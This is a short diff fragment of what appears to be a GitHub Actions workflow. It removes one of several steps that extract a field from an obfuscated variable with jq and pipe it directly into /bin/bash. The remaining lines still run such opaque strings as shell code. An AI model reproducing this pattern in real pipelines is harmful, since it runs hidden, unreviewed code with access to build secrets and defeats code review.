@@ -34,7 +34,6 @@ jobs:
           echo $nsvhj95674 | jq -r .kz53 | /bin/bash
           printf '%s' "$exx3" | jq -r .ex6 | /bin/bash
           printf '%s' "$pz300" | jq -r .kl90821 | /bin/bash
-          echo $hphmb2 | jq -r .t8 | /bin/bash
 
       - name: Save output
         if: always()
